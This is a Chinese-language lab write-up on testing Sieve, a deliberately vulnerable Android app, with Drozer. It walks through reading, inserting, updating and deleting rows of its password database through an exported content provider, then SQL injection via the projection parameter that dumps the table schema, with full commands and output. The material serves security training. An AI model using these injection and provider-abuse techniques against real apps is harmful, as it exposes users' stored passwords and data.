---
title: Test Sieve - content providers exported - DB Based
tags: [Android, Drozer]

category: "Tools/Others/Android Related/Drozer/Test Sieve"
---

# Test Sieve - content providers exported - DB Based
<!-- more -->
如果想知道實際的狀況和content URI是什麼，可以參考[ChatGPT的說明](https://chatgpt.com/share/3a06c1d4-8117-4b27-ad02-1189b931066d)
1. 起手式
    從以下command的結果可以知道`com.mwr.example.sieve.DBContentProvider`和`com.mwr.example.sieve.FileBackupProvider`的狀況，並且從結果可以知道URI的形式長怎樣
    ```bash
    content://com.mwr.example.sieve.DBContentProvider/Keys/
    content://com.mwr.example.sieve.DBContentProvider/Passwords/
    content://com.mwr.example.sieve.DBContentProvider/Passwords
    ```
    :::spoiler
    ```bash
    dz> run app.provider.info -a com.mwr.example.sieve
    Attempting to run shell module
    Package: com.mwr.example.sieve
      Authority: com.mwr.example.sieve.DBContentProvider
        Read Permission: null
        Write Permission: null
        Content Provider: com.mwr.example.sieve.DBContentProvider
        Multiprocess Allowed: True
        Grant Uri Permissions: False
        Uri Permission Patterns:
        Path Permissions:
          Path: /Keys
            Type: PATTERN_LITERAL
            Read Permission: com.mwr.example.sieve.READ_KEYS
            Write Permission: com.mwr.example.sieve.WRITE_KEYS
      Authority: com.mwr.example.sieve.FileBackupProvider
        Read Permission: null
        Write Permission: null
        Content Provider: com.mwr.example.sieve.FileBackupProvider
        Multiprocess Allowed: True
        Grant Uri Permissions: False
        Uri Permission Patterns:
        Path Permissions:
        
    dz> run scanner.provider.finduris -a com.mwr.example.sieve
    Attempting to run shell module
    Scanning com.mwr.example.sieve...
    No respone from content URI:      content://com.mwr.example.sieve.DBContentProvider/Keys
    No respone from content URI:      content://com.mwr.example.sieve.DBContentProvider/
    No respone from content URI:      content://com.mwr.example.sieve.DBContentProvider
    No respone from content URI:      content://com.mwr.example.sieve.FileBackupProvider
    No respone from content URI:      content://com.mwr.example.sieve.FileBackupProvider/
    Got a response from content Uri:  content://com.mwr.example.sieve.DBContentProvider/Keys/
    Got a response from content Uri:  content://com.mwr.example.sieve.DBContentProvider/Passwords/
    Got a response from content Uri:  content://com.mwr.example.sieve.DBContentProvider/Passwords

    For sure accessible content URIs:
      content://com.mwr.example.sieve.DBContentProvider/Keys/
      content://com.mwr.example.sieve.DBContentProvider/Passwords/
      content://com.mwr.example.sieve.DBContentProvider/Passwords
    ```
    :::
2. 逆向
    實際去看`DBContentProvider`這個class，會發現他把所有的query/update/delete/insert function都寫好了，不過我們可以先看初始化的時候onCreate在做的事情
    ```java
    @Override // android.content.ContentProvider
    public boolean onCreate() {
        this.pwdb = new PWDBHelper(getContext());
        this.sUriMatcher.addURI("com.mwr.example.sieve.DBContentProvider", PWTable.TABLE_NAME, 100);
        this.sUriMatcher.addURI("com.mwr.example.sieve.DBContentProvider", "Keys", KEY);
        return false;
    }
    ```
    再跟進去PWDBHelper，他主要就是管理 Android SQLite 資料庫的class，並進行初始化的動作，接著後續創了兩個table，包含==Passwords==和==Keys==(其實我覺得這個URI應該就類似database的table)
3. query/insert/update/delete/sqli
    * query
        ```bash
        #Simple Query
        dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
        Attempting to run shell module
             _id  1
         service
        username
        password  b'Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=' (Base64-encoded)
           email  bernie6401@gmail.com
        ```
    * insert
        根據上面的描述以及逆向的結果，我可以知道各個欄位的data type，insert的時候就是都加進去就可了
        ```bash
        dz> run app.provider.insert content://com.mwr.example.sieve.DBContentProvider/Passwords/ --integer _id 2 --string password bbb --string email aaa@bbb.com
        Attempting to run shell module
        Done.

        dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
        Attempting to run shell module
             _id  1
         service
        username
        password  b'Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=' (Base64-encoded)
           email  bernie6401@gmail.com

             _id  2
         service  null
        username  null
        password  bbb
           email  aaa@bbb.com
        ```
    * update
        \_id=2的data，被我們改掉了
        ```bash
        dz> run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "_id=?" --selection-args 2 --string password ccc --string email ddd@eee.com
        Attempting to run shell module
        Done.

        dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
        Attempting to run shell module
             _id  1
         service
        username
        password  b'Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=' (Base64-encoded)
           email  bernie6401@gmail.com

             _id  2
         service  null
        username  null
        password  ccc
           email  ddd@eee.com
        ```
    * delete
        只剩下最一開始我們設定的data
        ```bash
        dz> run app.provider.delete content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "_id=?" --selection-args 2
        Attempting to run shell module
        Done.

        dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
        Attempting to run shell module
             _id  1
         service
        username
        password  b'Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=' (Base64-encoded)
           email  bernie6401@gmail.com
        ```
    * sqli
        如下結果所示，的確存在sqli，並且可以得到完整的table
        ```bash
        # 先嘗試丟一些trash byte
        dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
        Attempting to run shell module
        Exception occured: unrecognized token: "')" (code 1 SQLITE_ERROR): , while compiling: SELECT * FROM Passwords WHERE (')
        dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords --projection "* FROM SQLITE_MASTER WHERE type='table';--"
        Attempting to run shell module
        | type  | name             | tbl_name         | rootpage | sql                                                                                              |
        | table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata (locale TEXT)                                                      |
        | table | Passwords        | Passwords        | 4        | CREATE TABLE Passwords (_id INTEGER PRIMARY KEY,service TEXT,username TEXT,password BLOB,email ) |
        | table | Key              | Key              | 5        | CREATE TABLE Key (Password TEXT PRIMARY KEY,pin TEXT )
        ```
        我們也可以用drozer自動幫我們找 
        ```bash
        dz> run scanner.provider.injection -a com.mwr.example.sieve
        Attempting to run shell module
        Scanning com.mwr.example.sieve...
        Not Vulnerable:
          content://com.mwr.example.sieve.DBContentProvider
          content://com.mwr.example.sieve.FileBackupProvider
          content://com.mwr.example.sieve.DBContentProvider/Keys
          content://com.mwr.example.sieve.DBContentProvider/
          content://com.mwr.example.sieve.FileBackupProvider/

        Injection in Projection:
          content://com.mwr.example.sieve.DBContentProvider/Passwords
          content://com.mwr.example.sieve.DBContentProvider/Keys/
          content://com.mwr.example.sieve.DBContentProvider/Passwords/

        Injection in Selection:
          content://com.mwr.example.sieve.DBContentProvider/Passwords
          content://com.mwr.example.sieve.DBContentProvider/Keys/
          content://com.mwr.example.sieve.DBContentProvider/Passwords/
        
        dz> run scanner.provider.sqltables -a com.mwr.example.sieve
        Attempting to run shell module
        Scanning com.mwr.example.sieve...
        Accessible tables for uri content://com.mwr.example.sieve.DBContentProvider/Passwords:
          android_metadata
          Passwords
          Key

        Accessible tables for uri content://com.mwr.example.sieve.DBContentProvider/Keys/:
          android_metadata
          Passwords
          Key

        Accessible tables for uri content://com.mwr.example.sieve.DBContentProvider/Passwords/:
          android_metadata
          Passwords
          Key
        ```